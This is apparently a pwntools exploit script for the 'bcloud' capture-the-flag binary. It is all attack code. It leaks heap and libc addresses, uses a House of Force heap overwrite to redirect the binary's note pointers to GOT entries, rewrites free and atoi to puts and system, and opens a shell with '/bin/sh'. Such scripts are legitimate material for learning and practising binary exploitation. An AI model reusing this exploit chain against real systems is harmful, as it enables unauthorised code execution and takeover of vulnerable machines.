from pwn import *
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
if args['DEBUG']:
    context.log_level = 'debug'
context.binary = "./bcloud"
bcloud = ELF("./bcloud")
if args['REMOTE']:
    p = remote('127.0.0.1', 7777)
else:
    p = process("./bcloud")
log.info('PID: ' + str(proc.pidof(p)[0]))
libc = ELF('./libc.so.6')


def offset_bin_main_arena(idx):
    word_bytes = context.word_size / 8
    offset = 4  # lock
    offset += 4  # flags
    offset += word_bytes * 10  # offset fastbin
    offset += word_bytes * 2  # top,last_remainder
    offset += idx * 2 * word_bytes  # idx
    offset -= word_bytes * 2  # bin overlap
    return offset


def exp():
    # leak heap base
    p.sendafter('Input your name:\n', 'a' * 64)
    p.recvuntil('Hey ' + 'a' * 64)
    # sub name's chunk' s header
    heap_base = u32(p.recv(4)) - 8
    log.success('heap_base: ' + hex(heap_base))
    p.sendafter('Org:\n', 'a' * 64)
    p.sendlineafter('Host:\n', p32(0xffffffff))
    # name,org,host, for each is (0x40+8)
    topchunk_addr = heap_base + (0x40 + 8) * 3

    # make topchunk point to 0x0804B0A0-8
    p.sendlineafter('option--->>', '1')
    notesize_addr = 0x0804B0A0
    notelist_addr = 0x0804B120
    targetaddr = notesize_addr - 8
    offset_target_top = targetaddr - topchunk_addr
    # 4 for size_t, 7 for malloc_allign
    malloc_size = offset_target_top - 4 - 7
    # plus 4 because malloc(v2 + 4);
    p.sendlineafter('Input the length of the note content:\n',
                    str(malloc_size - 4))
    # most likely malloc_size-4<0...
    if malloc_size - 4 > 0:
        p.sendlineafter('Input the content:\n', '')

    #gdb.attach(p)
    # set notesize[0] = notesize[1] = notesize[2]=16
    # set notelist[0] = free@got, notelist[1]= notelist[2]=atoi@got
    p.sendlineafter('option--->>', '1')
    p.sendlineafter('Input the length of the note content:\n', str(1000))

    payload = p32(16) * 3 + (notelist_addr - notesize_addr - 12) * 'a' + p32(
        bcloud.got['free']) + p32(bcloud.got['atoi']) * 2
    p.sendlineafter('Input the content:\n', payload)

    # overwrite free@got with puts@plt
    p.sendlineafter('option--->>', '3')
    p.sendlineafter('Input the id:\n', str(0))
    p.sendlineafter('Input the new content:\n', p32(bcloud.plt['puts']))

    # leak atoi addr by fake free
    p.sendlineafter('option--->>', '4')
    p.sendlineafter('Input the id:\n', str(1))
    atoi_addr = u32(p.recv(4))
    libc_base = atoi_addr - libc.symbols['atoi']
    system_addr = libc_base + libc.symbols['system']
    log.success('libc base addr: ' + hex(libc_base))

    # overwrite atoi@got with system
    p.sendlineafter('option--->>', '3')
    p.sendlineafter('Input the id:\n', str(2))
    p.sendlineafter('Input the new content:\n', p32(system_addr))

    # get shell
    p.sendlineafter('option--->>', '/bin/sh\x00')
    p.interactive()


if __name__ == "__main__":
    exp()
